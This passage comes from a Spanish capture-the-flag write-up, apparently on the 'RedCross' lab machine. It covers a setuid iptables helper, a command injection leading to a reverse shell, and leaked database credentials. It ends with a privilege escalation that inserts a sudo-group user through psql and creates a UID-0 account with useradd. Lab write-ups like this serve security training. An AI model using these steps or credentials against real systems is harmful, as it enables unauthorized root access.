		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Usage: %s allow|restrict|show IP&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;DEBUG: All checks passed... Executing iptables&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmdAR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-A&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmdAR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;-D&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmdShow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	
	&lt;span class=&#34;n&#34;&gt;child_pid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fork&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;child_pid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;execvp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Network access granted to %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Network access restricted to %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inputAddress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isAction&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ERR: Function not available!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Este archivo es utilizado en la segunda opcion del panel de administracion en &lt;code&gt;Network Access&lt;/code&gt;, al acceder a la segunda opcion nos muestra las ip que fueron agregada a la lista, en la que tambien podemos denegar el acceso a una IP.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/admin-access-firewall.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;rce---reverse-shell&#34;&gt;RCE - Reverse SHELL&lt;/h2&gt;
&lt;p&gt;El archivo que encontramos anteriormente fue compilado y probado localmente, el cual nos pide una opcion y una IP a la cual queremos autorizar|restringir|mostrar y al realizar un analisis a las peticiones al servidor con &amp;lsquo;Burpsuite&amp;rsquo; de esta pagina encontramos que podemos realizar una &amp;lsquo;Inyeccion de Comandos&amp;rsquo; mediante la opcion de denegar (&amp;lsquo;deny&amp;rsquo;) una IP y asi obtener una shell inversa con python.&lt;br /&gt;
INFO=&amp;gt;https://www.owasp.org/index.php/Command_Injection&lt;/p&gt;
&lt;video width=&#34;936&#34; height=&#34;542&#34; autoplay&gt;
  &lt;source src=&#34;https://sckull.github.io/images/posts/htb/redcross/RCE-redcross-video.mp4&#34; type=&#34;video/mp4&#34;&gt;  
  Your browser does not support the video tag.
&lt;/video&gt; 
&lt;hr /&gt;
&lt;h2 id=&#34;directorios-pagina-web&#34;&gt;DIRECTORIOS PAGINA WEB&lt;/h2&gt;
&lt;p&gt;Ya dentro de la maquina pudimos enumerar y descargar los archivos pertenecientes a la pagina web y su estructura es la siguiente.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/anexo-php.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;h3 id=&#34;creando-un-usuario---root&#34;&gt;Creando un Usuario - ROOT&lt;/h3&gt;
&lt;p&gt;Enumerando los archivos que se manejan en &lt;code&gt;/var/www/html/*&lt;/code&gt; los cuales pertenecen a la pagina web de la maquina, encontramos varios usuarios y contraseñas a Bases de Datos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;actions.php
&amp;#34;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;&amp;#34;
&amp;#34;host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&lt;span class=&#34;err&#34;&gt;&amp;amp;&lt;/span&gt;&amp;#34;
&amp;#34;host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;init.php
$dbhost=&amp;#39;127.0.0.1&amp;#39;; $dbuser=&amp;#39;dbcross&amp;#39;; $dbpass=&amp;#39;LOSPxnme4f5pH5wp&amp;#39;;$dbname=&amp;#39;redcross&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Como pudimos observar, en el panel de administracion podemos crear usuarios, los cuales estan en el grupo de asociados y limitados a una sola carpeta /var/jail/. El codigo php que agrega usuarios a la base de datos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;if($action===&amp;#39;adduser&amp;#39;){
	$username=$_POST[&amp;#39;username&amp;#39;];
	$passw=generateRandomString();
	$phash=crypt($passw);
	$dbconn = pg_connect(&amp;#34;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&lt;span class=&#34;ni&#34;&gt;&amp;amp;&amp;#34;);&lt;/span&gt;
	$result = pg_prepare($dbconn, &amp;#34;q1&amp;#34;, &amp;#34;insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, &amp;#39;/var/jail/home&amp;#39;)&amp;#34;);
	$result = pg_execute($dbconn, &amp;#34;q1&amp;#34;, array($username, $phash));
	echo &amp;#34;Provide this credentials to the user:&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;br&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;br&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&amp;#34;;
	&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#34;&amp;lt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;$username : $passw&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;br&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;br&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;/?page=users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;Continue&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&amp;#34;;--&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El &lt;code&gt;action: adduser&lt;/code&gt; realiza una conexion a la base de datos &lt;code&gt;unix&lt;/code&gt; y con el usuario &amp;lsquo;unixusrmgr&amp;rsquo; y realiza un query para insertar nombre de usuario, contraseña generada aleatoriamente y la encripta en &lt;code&gt;crypt&lt;/code&gt;, gid o al grupo de usuarios que existen en la maquina (&lt;code&gt;/etc/group - associates❌1001:&lt;/code&gt;), tambien un directorio especifico para el usuario. Sabiendo esto podemos tomar ventaja de esta funcion y crear nuestro propio usuario.&lt;/p&gt;
&lt;p&gt;Utilizando las mismas credenciales en la base de datos en la que se crean los usuarios, encontramos la tabla llamada &lt;code&gt;passwd_table&lt;/code&gt;, que contiene:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;   username    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;               passwd               &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; uid  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; gid  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; gecos &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    homedir     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   shell   
---------------+------------------------------------+------+------+-------+----------------+-----------
	...							....				...		...		....	....				...
 greater       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$1$bRaICuCW$oRz&lt;/span&gt;.QUxie1yqP5Jbi3Z1v/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /root          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /bin/bash
 mailadm       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$1$bRaICuCW$oRz&lt;/span&gt;.QUxie1yqP5Jbi3Z1v/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2024&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /home/penelope &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /bin/bash
 slot          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$1$Zjw7H894$4&lt;/span&gt;mUPW1tgQmV5QVKUIOeKZ/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2027&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /var/jail/home &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /bin/bash
 shadow        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$1$bRaICuCW$oRz&lt;/span&gt;.QUxie1yqP5Jbi3Z1v/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2029&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;42&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /home/         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /bin/bash
 goku          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$1$bRaICuCW$oRz&lt;/span&gt;.QUxie1yqP5Jbi3Z1v/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2033&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /home/         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /bin/bash
 adm           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$1$Ca4NB5YL$1&lt;/span&gt;VBlUqIoGQg.LSqbiZ7FY/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2034&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /home/penelope &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ya que el usuario &lt;code&gt;unixusrmgr&lt;/code&gt; tiene permisos para insertar datos en esta tabla, podemos tomar ventaja e insertar nuestro propio usuario con permisos sudo a la base de datos, logearnos mediante ssh para luego poder crear y agregar un usuario con permisos(gid) root a la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;/usr/lib/postgresql/9.6/bin/psql -h 127.0.0.1 -U unixusrmgr unix
Password: dheu%7wjx8B&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para crear la contraseña utilizamos la siguiente pagina: &lt;a href=&#34;https://es.functions-online.com/crypt.html&#34;&gt;https://es.functions-online.com/crypt.html&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$1$Ca4NB5YL$1&lt;/span&gt;VBlUqIoGQg.LSqbiZ7FY/:greatstuff
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;sql---insert&#34;&gt;SQL - INSERT&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwd_table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;homedir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;batman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;$1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;27&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/root&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;crear-usuario-sudo&#34;&gt;Crear Usuario Sudo&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo useradd -ou &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; -g &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; happy
sudo passwd happy
su happy
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
